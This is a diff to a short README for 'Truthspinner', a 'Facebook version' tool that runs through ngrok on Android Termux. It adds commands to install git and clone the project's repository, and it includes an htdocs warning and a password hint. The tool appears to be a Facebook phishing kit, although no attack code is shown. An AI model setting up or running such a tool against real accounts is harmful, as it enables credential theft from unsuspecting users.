@@ -1,6 +1,11 @@
 #Truthspinner -  FACEBOOK VERSION 1.0
 This contains ngrok version that is best for android TERMUX .
 
+Use following commands-
+pkg install git -y
+git clone https://github.com/thetruthspinner/truthspinner.git
+cd truthspinner
+
 Please remove all stuff from htdocs folder because it will delete all stuff inside it. 
 
 Password is full form of- d-y
